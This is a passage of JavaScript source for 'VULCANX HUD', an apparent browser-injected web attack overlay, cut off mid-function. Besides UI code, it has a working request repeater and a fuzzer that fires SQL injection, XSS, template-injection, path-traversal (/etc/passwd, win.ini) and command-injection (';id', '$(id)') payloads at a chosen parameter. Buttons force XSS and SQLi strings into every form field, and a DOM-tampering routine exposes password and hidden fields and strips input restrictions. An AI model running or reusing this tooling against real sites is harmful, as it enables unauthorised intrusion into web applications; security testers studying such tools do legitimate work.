
(function initWidget() {
    try {
        if (!document.body) {
            setTimeout(initWidget, 100);
            return;
        }
        var w = document.getElementById('vulcanx-widget');
        if (!w) {
            // Create CSS Stylesheet dynamically
            var style = document.createElement('style');
            style.innerHTML = `
                #vulcanx-widget * { box-sizing: border-box; }
                .vx-header { background: #1a1a24; cursor: move; user-select: none; }
                .vx-tab-btn.active { border-bottom: 2px solid #ff0055 !important; color: #ff0055 !important; }
                .vx-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px; }
                .vx-table th, .vx-table td { border: 1px solid #333; padding: 6px 8px; text-align: left; word-break: break-all; }
                .vx-table th { background: #151520; color: #aaa; }
                .vx-table tr:hover { background: rgba(255,255,255,0.03); }
                .vx-finding-details { background: #1c1c28; border-left: 2px solid #ff0055; margin: 5px 0; padding: 10px; font-size: 11px; border-radius: 0 4px 4px 0; }
                .vx-badge { padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: bold; }
                .vx-badge-critical { background: #ff0055; color: #fff; }
                .vx-badge-high { background: #ff5500; color: #fff; }
                .vx-badge-medium { background: #ffcc00; color: #000; }
                .vx-badge-low { background: #00ccff; color: #000; }
                .vx-badge-info { background: #888; color: #fff; }
            `;
            document.head.appendChild(style);

            w = document.createElement('div');
            w.id = 'vulcanx-widget';
            w.style.position = 'fixed';
            w.style.bottom = '20px';
            w.style.right = '20px';
            w.style.width = '485px';
            w.style.height = '420px';
            w.style.resize = 'both';
            w.style.overflow = 'hidden';
            w.style.backgroundColor = 'rgba(15, 15, 22, 0.95)';
            w.style.color = '#e2e2e9';
            w.style.border = '1px solid rgba(255, 0, 85, 0.4)';
            w.style.borderRadius = '10px';
            w.style.zIndex = '2147483647';
            w.style.fontFamily = 'monospace';
            w.style.fontSize = '12px';
            w.style.boxShadow = '0 10px 40px rgba(0,0,0,0.5), 0 0 20px rgba(255,0,85,0.15)';
            w.style.display = 'flex';
            w.style.flexDirection = 'column';

            // Drag handler
            var header = document.createElement('div');
            header.className = 'vx-header';
            header.style.display = 'flex';
            header.style.justifyContent = 'space-between';
            header.style.alignItems = 'center';
            header.style.padding = '10px 15px';
            header.style.borderBottom = '1px solid #333';
            
            var title = document.createElement('strong');
            title.innerText = 'VULCANX HUD';
            title.style.color = '#ff0055';
            title.style.letterSpacing = '1px';
            header.appendChild(title);

            var controlGroup = document.createElement('div');
            controlGroup.style.display = 'flex';
            controlGroup.style.alignItems = 'center';

            var minBtn = document.createElement('button');
            minBtn.innerText = '_';
            minBtn.style.background = '#2a2a35';
            minBtn.style.color = '#fff';
            minBtn.style.border = 'none';
            minBtn.style.padding = '3px 8px';
            minBtn.style.borderRadius = '4px';
            minBtn.style.cursor = 'pointer';
            minBtn.onclick = function() {
                var bodyEl = document.getElementById('vulcanx-body');
                if (bodyEl.style.display === 'none') {
                    bodyEl.style.display = 'flex';
                    w.style.height = '420px';
                } else {
                    bodyEl.style.display = 'none';
                    w.style.height = '40px';
                }
            };
            controlGroup.appendChild(minBtn);

            header.appendChild(controlGroup);
            w.appendChild(header);

            // Drag implementation
            var isDragging = false;
            var startX, startY, initialLeft, initialTop;
            header.onmousedown = function(e) {
                if (e.target.tagName === 'BUTTON') return;
                isDragging = true;
                startX = e.clientX;
                startY = e.clientY;
                initialLeft = w.offsetLeft;
                initialTop = w.offsetTop;
                document.onmousemove = function(e) {
                    if (!isDragging) return;
                    var dx = e.clientX - startX;
                    var dy = e.clientY - startY;
                    w.style.left = (initialLeft + dx) + 'px';
                    w.style.top = (initialTop + dy) + 'px';
                    w.style.bottom = 'auto';
                    w.style.right = 'auto';
                };
                document.onmouseup = function() {
                    isDragging = false;
                    document.onmousemove = null;
                };
            };

            // Main body
            var bodyEl = document.createElement('div');
            bodyEl.id = 'vulcanx-body';
            bodyEl.style.flex = '1';
            bodyEl.style.display = 'flex';
            bodyEl.style.flexDirection = 'column';
            bodyEl.style.overflow = 'hidden';

            // Tab bar
            var tabBar = document.createElement('div');
            tabBar.style.display = 'flex';
            tabBar.style.background = '#11111a';
            tabBar.style.borderBottom = '1px solid #222';
            
            var tabs = ['vulnerabilities', 'traffic', 'forms', 'storage', 'map', 'vpn'];
            var tabLabels = ['Findings', 'Traffic', 'Forms', 'Storage', 'LinkMap', 'VPN'];
            tabs.forEach(function(tab, index) {
                var btn = document.createElement('button');
                btn.className = 'vx-tab-btn';
                if (index === 0) btn.className += ' active';
                btn.innerText = tabLabels[index];
                btn.style.flex = '1';
                btn.style.background = 'none';
                btn.style.border = 'none';
                btn.style.color = '#888';
                btn.style.padding = '8px 4px';
                btn.style.cursor = 'pointer';
                btn.style.fontSize = '11px';
                btn.style.fontWeight = 'bold';
                btn.style.textTransform = 'uppercase';
                btn.onclick = function() {
                    Array.from(tabBar.children).forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    window.__vulcanx_state.activeTab = tab;
                    window.__vulcanx_render();
                };
                tabBar.appendChild(btn);
            });
            bodyEl.appendChild(tabBar);

            // Container
            var contentContainer = document.createElement('div');
            contentContainer.id = 'vulcanx-content-pane';
            contentContainer.style.flex = '1';
            contentContainer.style.overflowY = 'auto';
            contentContainer.style.padding = '12px';
            bodyEl.appendChild(contentContainer);

            w.appendChild(bodyEl);
            document.body.appendChild(w);

            window.__vulcanx_state = {
                findings: [],
                traffic: [],
                activeTab: 'vulnerabilities',
                highlighting: false
            };
            
            // Force initial render asynchronously so the function is defined
            setTimeout(function() { window.__vulcanx_render(); }, 50);
        }

        // Functions for rendering and features
        window.__vulcanx_render = function() {
            var container = document.getElementById('vulcanx-content-pane');
            if (!container) return;
            var tab = window.__vulcanx_state.activeTab;

            if (tab === 'vulnerabilities') {
                container.innerHTML = '';
                var findings = window.__vulcanx_state.findings || [];
                if (findings.length === 0) {
                    container.innerHTML = '<div style="color:#666;text-align:center;margin-top:50px;">No vulnerabilities detected yet.</div>';
                    return;
                }

                // Group by type
                var groups = {};
                findings.forEach(f => {
                    var type = f.type || 'UNKNOWN';
                    if (!groups[type]) groups[type] = [];
                    groups[type].push(f);
                });

                Object.keys(groups).forEach(type => {
                    var list = groups[type];
                    var first = list[0];
                    var severity = first.severity || 'INFO';
                    var badgeClass = 'vx-badge vx-badge-' + severity.toLowerCase();
                    
                    var details = document.createElement('details');
                    details.style.marginBottom = '10px';
                    details.style.borderBottom = '1px solid #222';
                    details.style.paddingBottom = '8px';

                    if (window.__vx_open_details && window.__vx_open_details[type]) {
                        details.open = true;
                    }
                    details.addEventListener('toggle', function() {
                        window.__vx_open_details = window.__vx_open_details || {};
                        window.__vx_open_details[type] = details.open;
                    });

                    var summary = document.createElement('summary');
                    summary.style.cursor = 'pointer';
                    summary.style.fontWeight = 'bold';
                    summary.style.outline = 'none';
                    summary.innerHTML = `<span class="${badgeClass}">${severity}</span> <span style="margin-left:5px;">${type}</span> <span style="color:#666;font-size:10px;">(${list.length})</span>`;
                    details.appendChild(summary);

                    var descDiv = document.createElement('div');
                    descDiv.className = 'vx-finding-details';
                    
                    var remediation = first.remediation || 'Review and secure this resource.';
                    var description = first.description || 'Vulnerability detected.';
                    descDiv.innerHTML = `<div style="color:#ffcc00;margin-bottom:6px;">💡 ${description}</div>
                                         <div style="color:#aaa;margin-bottom:10px;font-style:italic;">Remediation: ${remediation}</div>`;

                    list.forEach(f => {
                        var item = document.createElement('div');
                        item.style.marginBottom = '6px';
                        var method = f.method || '';
                        var status = f.status_code || '';
                        var meta = (method || status) ? `[${method} ${status}] ` : '';
                        var match = f.match || '';
                        if (match.length > 100) match = match.substring(0, 100) + '...';
                        item.innerHTML = `<strong style="color:#ff0055;font-size:10px;">${meta}</strong><span style="color:#4da6ff;word-break:break-all;">${f.url}</span><br>
                                          <span style="color:#888;">Match: <code style="color:#ccc;">${match}</code></span>`;
                        descDiv.appendChild(item);
                    });

                    details.appendChild(descDiv);
                    container.appendChild(details);
                })            } else if (tab === 'traffic') {
                container.innerHTML = '';
                var traffic = window.__vulcanx_state.traffic || [];
                
                // Add Repeater Section at the top
                var repeaterDiv = document.createElement('div');
                repeaterDiv.id = 'vx-repeater';
                repeaterDiv.style.display = 'none';
                repeaterDiv.style.marginBottom = '15px';
                repeaterDiv.style.padding = '10px';
                repeaterDiv.style.background = '#1a1a24';
                repeaterDiv.style.border = '1px solid #ff0055';
                repeaterDiv.style.borderRadius = '5px';
                
                var repeaterHeader = document.createElement('div');
                repeaterHeader.style.display = 'flex';
                repeaterHeader.style.justifyContent = 'space-between';
                repeaterHeader.style.marginBottom = '8px';
                repeaterHeader.innerHTML = '<strong style="color:#ff0055;">Repeater</strong> <button id="vx-close-repeater" style="background:none;border:none;color:#fff;cursor:pointer;">X</button>';
                repeaterDiv.appendChild(repeaterHeader);
                
                var repeaterMethodUrl = document.createElement('div');
                repeaterMethodUrl.style.display = 'flex';
                repeaterMethodUrl.style.marginBottom = '8px';
                
                var methodSelect = document.createElement('select');
                ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'].forEach(m => {
                    var opt = document.createElement('option');
                    opt.value = m;
                    opt.innerText = m;
                    methodSelect.appendChild(opt);
                });
                methodSelect.style.background = '#222';
                methodSelect.style.color = '#fff';
                methodSelect.style.border = '1px solid #444';
                methodSelect.style.marginRight = '4px';
                methodSelect.id = 'vx-rep-method';
                
                var urlInput = document.createElement('input');
                urlInput.type = 'text';
                urlInput.id = 'vx-rep-url';
                urlInput.style.flex = '1';
                urlInput.style.background = '#222';
                urlInput.style.color = '#fff';
                urlInput.style.border = '1px solid #444';
                
                repeaterMethodUrl.appendChild(methodSelect);
                repeaterMethodUrl.appendChild(urlInput);
                repeaterDiv.appendChild(repeaterMethodUrl);
                
                var headersLabel = document.createElement('div');
                headersLabel.innerText = 'Headers (JSON):';
                headersLabel.style.fontSize = '10px';
                headersLabel.style.color = '#aaa';
                repeaterDiv.appendChild(headersLabel);
                
                var headersInput = document.createElement('textarea');
                headersInput.id = 'vx-rep-headers';
                headersInput.style.width = '100%';
                headersInput.style.height = '60px';
                headersInput.style.background = '#222';
                headersInput.style.color = '#fff';
                headersInput.style.border = '1px solid #444';
                headersInput.style.marginBottom = '8px';
                headersInput.style.fontFamily = 'monospace';
                headersInput.style.fontSize = '10px';
                repeaterDiv.appendChild(headersInput);
                
                var bodyLabel = document.createElement('div');
                bodyLabel.innerText = 'Body:';
                bodyLabel.style.fontSize = '10px';
                bodyLabel.style.color = '#aaa';
                repeaterDiv.appendChild(bodyLabel);
                
                var bodyInput = document.createElement('textarea');
                bodyInput.id = 'vx-rep-body';
                bodyInput.style.width = '100%';
                bodyInput.style.height = '60px';
                bodyInput.style.background = '#222';
                bodyInput.style.color = '#fff';
                bodyInput.style.border = '1px solid #444';
                bodyInput.style.marginBottom = '8px';
                bodyInput.style.fontFamily = 'monospace';
                bodyInput.style.fontSize = '10px';
                repeaterDiv.appendChild(bodyInput);
                
                var btnGroup = document.createElement('div');
                btnGroup.style.display = 'flex';
                btnGroup.style.gap = '10px';
                btnGroup.style.marginBottom = '8px';

                var sendBtn = document.createElement('button');
                sendBtn.innerText = 'Send Request';
                sendBtn.style.background = '#004488';
                sendBtn.style.color = '#fff';
                sendBtn.style.border = '1px solid #0088ff';
                sendBtn.style.padding = '4px 8px';
                sendBtn.style.borderRadius = '3px';
                sendBtn.style.cursor = 'pointer';
                btnGroup.appendChild(sendBtn);
                
                var fuzzBtn = document.createElement('button');
                fuzzBtn.innerText = 'Fuzz Selection (Intruder)';
                fuzzBtn.style.background = '#660000';
                fuzzBtn.style.color = '#fff';
                fuzzBtn.style.border = '1px solid #ff0055';
                fuzzBtn.style.padding = '4px 8px';
                fuzzBtn.style.borderRadius = '3px';
                fuzzBtn.style.cursor = 'pointer';
                fuzzBtn.title = "Highlight a piece of text in the URL or Body to inject payloads.";
                btnGroup.appendChild(fuzzBtn);

                repeaterDiv.appendChild(btnGroup);

                var fuzzerStatus = document.createElement('div');
                fuzzerStatus.id = 'vx-fuzzer-status';
                fuzzerStatus.style.display = 'none';
                fuzzerStatus.style.marginBottom = '8px';
                fuzzerStatus.style.fontSize = '10px';
                fuzzerStatus.style.color = '#ffcc00';
                repeaterDiv.appendChild(fuzzerStatus);
                
                var respDiv = document.createElement('div');
                respDiv.id = 'vx-rep-response';
                respDiv.style.display = 'none';
                respDiv.style.borderTop = '1px solid #444';
                respDiv.style.paddingTop = '8px';
                
                var respStatus = document.createElement('div');
                respStatus.id = 'vx-rep-status';
                respStatus.style.fontWeight = 'bold';
                respStatus.style.marginBottom = '4px';
                respDiv.appendChild(respStatus);
                
                var respBody = document.createElement('textarea');
                respBody.id = 'vx-rep-respbody';
                respBody.style.width = '100%';
                respBody.style.height = '100px';
                respBody.style.background = '#111';
                respBody.style.color = '#00ff55';
                respBody.style.border = '1px solid #333';
                respBody.style.fontFamily = 'monospace';
                respBody.style.fontSize = '10px';
                respBody.readOnly = true;
                respDiv.appendChild(respBody);
                
                repeaterDiv.appendChild(respDiv);
                container.appendChild(repeaterDiv);
                
                // Repeater logic
                document.addEventListener('click', function(e) {
                    if (e.target && e.target.id === 'vx-close-repeater') {
                        document.getElementById('vx-repeater').style.display = 'none';
                    }
                });
                
                sendBtn.onclick = async function() {
                    sendBtn.innerText = 'Sending...';
                    sendBtn.disabled = true;
                    respDiv.style.display = 'none';
                    
                    var method = methodSelect.value;
                    var url = urlInput.value;
                    var body = bodyInput.value;
                    var headersStr = headersInput.value;
                    var headers = {};
                    try {
                        headers = JSON.parse(headersStr);
                    } catch(e) {}
                    
                    var opts = { method: method, headers: headers, credentials: 'omit' };
                    if (method !== 'GET' && method !== 'HEAD' && body) {
                        opts.body = body;
                    }
                    
                    try {
                        var res = await fetch(url, opts);
                        var text = await res.text();
                        respStatus.innerText = 'HTTP ' + res.status;
                        respStatus.style.color = res.ok ? '#00ff55' : '#ff0055';
                        respBody.value = text;
                        respDiv.style.display = 'block';
                    } catch(err) {
                        respStatus.innerText = 'Error: ' + err.message;
                        respStatus.style.color = '#ff0055';
                        respBody.value = '';
                        respDiv.style.display = 'block';
                    }
                    sendBtn.innerText = 'Send Request';
                    sendBtn.disabled = false;
                };

                fuzzBtn.onclick = async function() {
                    // Try to get selected text from URL or Body
                    var activeEl = document.activeElement;
                    var isUrl = activeEl && activeEl.id === 'vx-rep-url';
                    var isBody = activeEl && activeEl.id === 'vx-rep-body';
                    
                    if (!isUrl && !isBody) {
                        alert("Please click inside the URL or Body field and highlight the text you want to fuzz (e.g. highlight '1' in id=1).");
                        return;
                    }

                    var selectionStart = activeEl.selectionStart;
                    var selectionEnd = activeEl.selectionEnd;
                    
                    if (selectionStart === selectionEnd) {
                        alert("Please highlight/select the specific text you want to replace with payloads.");
                        return;
                    }

                    var originalText = activeEl.value;
                    var prefix = originalText.substring(0, selectionStart);
                    var suffix = originalText.substring(selectionEnd);
                    var targetString = originalText.substring(selectionStart, selectionEnd);

                    if (!confirm("Start Fuzzer? We will inject payloads into the highlighted parameter: '" + targetString + "'")) {
                        return;
                    }

                    fuzzBtn.disabled = true;
                    fuzzBtn.style.opacity = '0.5';
                    fuzzerStatus.style.display = 'block';
                    respDiv.style.display = 'none';

                    var payloads = [
                        "'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\\\", "\\\\\\\\", ";", "' or \"", "-- or #", 
                        "' OR '1", "' OR 1 -- -", "\" OR \"\" = \"", "\" OR 1 = 1 -- -", "' OR '' = '",
                        "admin' --", "admin' #", "' OR 'x'='x",
                        "<script>alert(1)</script>", "\"><script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "[[5*5]]",
                        "../../../../etc/passwd", "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini",
                        ";id", "|id", "`id`", "$(id)"
                    ];

                    var method = methodSelect.value;
                    var headersStr = headersInput.value;
                    var headers = {};
                    try { headers = JSON.parse(headersStr); } catch(e) {}

                    var url = urlInput.value;
                    var body = bodyInput.value;

                    var hits = 0;
                    var errors = 0;

                    for (let i = 0; i < payloads.length; i++) {
                        var p = payloads[i];
                        fuzzerStatus.innerText = `Fuzzing: ${i+1}/${payloads.length} [Payload: ${p}]`;
                        
                        var f_url = url;
                        var f_body = body;

                        if (isUrl) f_url = prefix + encodeURIComponent(p) + suffix;
                        if (isBody) f_body = prefix + p + suffix;

                        var opts = { method: method, headers: headers, credentials: 'omit' };
                        if (method !== 'GET' && method !== 'HEAD' && f_body) {
                            opts.body = f_body;
                        }

                        try {
                            var res = await fetch(f_url, opts);
                            var text = await res.text();
                            
                            // Check for simple reflection or errors
                            var interesting = false;
                            if (res.status >= 500) interesting = true;
                            if (text.includes("syntax error") || text.includes("mysql") || text.includes("Warning:") || text.includes("Exception")) interesting = true;
                            if (p === "<script>alert(1)</script>" && text.includes(p)) interesting = true;
                            if (p === "{{7*7}}" && text.includes("49")) interesting = true;
                            
                            if (interesting) {
                                hits++;
                                // Log to traffic so user can review it
                                window.__vulcanx_state.traffic.unshift({
                                    id: Math.random().toString(),
                                    method: method,
                                    url: f_url,
                                    display_url: f_url.length > 150 ? f_url.substring(0,150) + "..." : f_url,
                                    status_code: res.status,
                                    time: new Date().toTimeString().split(' ')[0],
                                    req_headers: headers,
                                    req_body: f_body
                                });
                            }
                        } catch(e) {
                            errors++;
                        }
                    }

                    fuzzerStatus.innerText = `Fuzzing Complete! ${hits} interesting responses found. Check Traffic tab. (Errors: ${errors})`;
                    fuzzBtn.disabled = false;
                    fuzzBtn.style.opacity = '1';
                    
                    if (hits > 0) {
                        window.__vulcanx_render();
                        alert(`Fuzzer finished. Found ${hits} potentially vulnerable responses. They have been added to the top of your Traffic log for review!`);
                    } else {
                        setTimeout(() => fuzzerStatus.style.display = 'none', 5000);
                    }
                };

                if (traffic.length === 0) {
                    var emptyMsg = document.createElement('div');
                    emptyMsg.innerHTML = '<div style="color:#666;text-align:center;margin-top:50px;">No traffic intercepted yet.</div>';
                    container.appendChild(emptyMsg);
                    return;
                }

                var table = document.createElement('table');
                table.className = 'vx-table';
                table.innerHTML = `<thead>
                                    <tr>
                                        <th style="width:60px;">Time</th>
                                        <th style="width:40px;">Method</th>
                                        <th>URL</th>
                                        <th style="width:45px;">Status</th>
                                    </tr>
                                   </thead>`;
                var tbody = document.createElement('tbody');
                traffic.forEach((t, i) => {
                    var tr = document.createElement('tr');
                    tr.style.cursor = 'pointer';
                    var stColor = t.status_code >= 400 ? '#ff5500' : (t.status_code >= 300 ? '#ffcc00' : '#00ff55');
                    tr.innerHTML = `<td>${t.time}</td>
                                    <td style="font-weight:bold;color:#4da6ff;">${t.method}</td>
                                    <td style="color:#aaa;word-break:break-all;" title="${t.url}">${t.display_url || t.url}</td>
                                    <td style="color:${stColor};font-weight:bold;">${t.status_code || 'PENDING'}</td>`;
                    
                    tr.onmouseover = () => tr.style.background = '#333';
                    tr.onmouseout = () => tr.style.background = 'transparent';
                    
                    tr.onclick = function() {
                        document.getElementById('vx-repeater').style.display = 'block';
                        document.getElementById('vx-rep-method').value = t.method;
                        document.getElementById('vx-rep-url').value = t.url;
                        
                        // Parse headers if they exist
                        var hStr = '{}';
                        if (t.req_headers) {
                            try {
                                hStr = JSON.stringify(t.req_headers, null, 2);
                            } catch(e){}
                        }
                        document.getElementById('vx-rep-headers').value = hStr;
                        document.getElementById('vx-rep-body').value = t.req_body || '';
                        
                        document.getElementById('vx-rep-response').style.display = 'none';
                        document.getElementById('vx-repeater').scrollIntoView({ behavior: 'smooth', block: 'start' });
                    };
                    
                    tbody.appendChild(tr);
                });
                table.appendChild(tbody);
                container.appendChild(table);

            } else if (tab === 'forms') {
                container.innerHTML = '';
                
                var hlBtn = document.createElement('button');
                hlBtn.innerText = window.__vulcanx_state.highlighting ? 'Disable Input Highlight' : 'Enable Input Highlight';
                hlBtn.style.width = '100%';
                hlBtn.style.padding = '8px';
                hlBtn.style.background = window.__vulcanx_state.highlighting ? '#800000' : '#006644';
                hlBtn.style.color = '#fff';
                hlBtn.style.border = 'none';
                hlBtn.style.borderRadius = '4px';
                hlBtn.style.cursor = 'pointer';
                hlBtn.style.fontWeight = 'bold';
                hlBtn.style.marginBottom = '12px';
                
                hlBtn.onclick = function() {
                    window.__vulcanx_state.highlighting = !window.__vulcanx_state.highlighting;
                    window.__vulcanx_toggle_inputs();
                    window.__vulcanx_render();
                };
                container.appendChild(hlBtn);

                var inputs = Array.from(document.querySelectorAll('input:not([type="hidden"]), textarea'));
                if (inputs.length === 0) {
                    var noInput = document.createElement('div');
                    noInput.style.color = '#666';
                    noInput.style.textAlign = 'center';
                    noInput.style.marginTop = '20px';
                    noInput.innerText = 'No input fields found on the current page.';
                    container.appendChild(noInput);
                    return;
                }

                var fillAllXSS = document.createElement('button');
                fillAllXSS.innerText = 'Fill All XSS';
                fillAllXSS.style.width = '30%';
                fillAllXSS.style.padding = '8px';
                fillAllXSS.style.background = '#440055';
                fillAllXSS.style.color = '#fff';
                fillAllXSS.style.border = '1px solid #ff00ff';
                fillAllXSS.style.borderRadius = '4px';
                fillAllXSS.style.cursor = 'pointer';
                fillAllXSS.style.fontWeight = 'bold';
                fillAllXSS.style.marginBottom = '12px';
                fillAllXSS.style.marginRight = '2%';
                fillAllXSS.onclick = function() {
                    inputs.forEach(input => {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, '\"><script>alert(document.domain)</script>'); } else { input.value = '\"><script>alert(document.domain)</script>'; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.style.border = '2px solid #ff00ff';
                    });
                };
                container.appendChild(fillAllXSS);
                
                var fillAllSQLi = document.createElement('button');
                fillAllSQLi.innerText = 'Fill All SQLi';
                fillAllSQLi.style.width = '30%';
                fillAllSQLi.style.padding = '8px';
                fillAllSQLi.style.background = '#331100';
                fillAllSQLi.style.color = '#fff';
                fillAllSQLi.style.border = '1px solid #ff5500';
                fillAllSQLi.style.borderRadius = '4px';
                fillAllSQLi.style.cursor = 'pointer';
                fillAllSQLi.style.fontWeight = 'bold';
                fillAllSQLi.style.marginBottom = '12px';
                fillAllSQLi.style.marginRight = '2%';
                fillAllSQLi.onclick = function() {
                    inputs.forEach(input => {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, "admin' --"); } else { input.value = "admin' --"; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.style.border = '2px solid #ff5500';
                    });
                };
                container.appendChild(fillAllSQLi);
                
                var tamperDOM = document.createElement('button');
                tamperDOM.innerText = 'Tamper DOM (Reveal All)';
                tamperDOM.style.width = '100%';
                tamperDOM.style.padding = '8px';
                tamperDOM.style.background = '#004400';
                tamperDOM.style.color = '#00ff55';
                tamperDOM.style.border = '1px solid #00ff55';
                tamperDOM.style.borderRadius = '4px';
                tamperDOM.style.cursor = 'pointer';
                tamperDOM.style.fontWeight = 'bold';
                tamperDOM.style.marginBottom = '12px';
                tamperDOM.onclick = function() {
                    // Reveal hidden inputs, convert passwords to text, remove maxlengths and disabled attributes
                    var modifiedCount = 0;
                    document.querySelectorAll('input, select, textarea, button').forEach(el => {
                        if (el.type === 'hidden') {
                            el.type = 'text';
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.type === 'password') {
                            el.type = 'text';
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.hasAttribute('disabled')) {
                            el.removeAttribute('disabled');
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.hasAttribute('readonly')) {
                            el.removeAttribute('readonly');
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.hasAttribute('maxlength')) {
                            el.removeAttribute('maxlength');
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                    });
                    if (modifiedCount > 0) {
                        alert("DOM Tampering Active! " + modifiedCount + " elements modified (revealed hidden fields, removed disabled/readonly/maxlength attributes).");
                    } else {
                        alert("No restricted DOM elements found to tamper with.");
                    }
                };
                container.appendChild(tamperDOM);

                var clearAll = document.createElement('button');
                clearAll.innerText = 'Clear Forms';
                clearAll.style.width = '30%';
                clearAll.style.padding = '8px';
                clearAll.style.background = '#222';
                clearAll.style.color = '#fff';
                clearAll.style.border = '1px solid #444';
                clearAll.style.borderRadius = '4px';
                clearAll.style.cursor = 'pointer';
                clearAll.style.fontWeight = 'bold';
                clearAll.style.marginBottom = '12px';
                clearAll.onclick = function() {
                    inputs.forEach(input => {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, ""); } else { input.value = ""; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.style.border = '';
                    });
                };
                container.appendChild(clearAll);


                var table = document.createElement('table');
                table.className = 'vx-table';
                table.innerHTML = `<thead>
                                    <tr>
                                        <th>Name/ID</th>
                                        <th>Type</th>
                                        <th>Actions</th>
                                    </tr>
                                   </thead>`;
                var tbody = document.createElement('tbody');
                inputs.forEach((input, index) => {
                    var identifier = input.name || input.id || `Input #${index+1}`;
                    var type = input.tagName === 'TEXTAREA' ? 'textarea' : (input.type || 'text');
                    
                    var tr = document.createElement('tr');
                    var tdName = document.createElement('td');
                    tdName.innerText = identifier;
                    tdName.style.color = '#aaa';
                    tr.appendChild(tdName);

                    var tdType = document.createElement('td');
                    tdType.innerText = type;
                    tr.appendChild(tdType);

                    var tdActions = document.createElement('td');
                    
                    var fillXSS = document.createElement('button');
                    fillXSS.innerText = 'Fill XSS';
                    fillXSS.style.fontSize = '9px';
                    fillXSS.style.marginRight = '4px';
                    fillXSS.style.background = '#440055';
                    fillXSS.style.border = '1px solid #ff00ff';
                    fillXSS.style.color = '#fff';
                    fillXSS.style.borderRadius = '3px';
                    fillXSS.style.cursor = 'pointer';
                    fillXSS.onclick = function() {
                        // Use a native value setter to bypass React's property descriptor overrides
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) {
                            setter.call(input, '\"><script>alert(document.domain)</script>');
                        } else {
                            input.value = '\"><script>alert(document.domain)</script>';
                        }
                        
                        // Dispatch events so frontend frameworks (React, Angular, Vue) register the change
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        
                        input.focus();
                        input.style.border = '2px solid #ff00ff';
                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    };
                    tdActions.appendChild(fillXSS);

                    var fillSQL = document.createElement('button');
                    fillSQL.innerText = 'Fill SQLi';
                    fillSQL.style.fontSize = '9px';
                    fillSQL.style.marginRight = '4px';
                    fillSQL.style.background = '#331100';
                    fillSQL.style.border = '1px solid #ff5500';
                    fillSQL.style.color = '#fff';
                    fillSQL.style.borderRadius = '3px';
                    fillSQL.style.cursor = 'pointer';
                    fillSQL.onclick = function() {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, "admin' --"); } else { input.value = "admin' --"; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.focus();
                        input.style.border = '2px solid #ff5500';
                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    };
                    tdActions.appendChild(fillSQL);

                    var fillSSTI = document.createElement('button');
                    fillSSTI.innerText = 'Fill SSTI';
                    fillSSTI.style.fontSize = '9px';
                    fillSSTI.style.marginRight = '4px';
                    fillSSTI.style.background = '#002244';
                    fillSSTI.style.border = '1px solid #0088ff';
                    fillSSTI.style.color = '#fff';
                    fillSSTI.style.borderRadius = '3px';
                    fillSSTI.style.cursor = 'pointer';
                    fillSSTI.onclick = function() {
                        var payload = "{{7*7}} ${7*7} <%= 7*7 %>";
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, payload); } else { input.value = payload; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.focus();
                        input.style.border = '2px solid #0088ff';
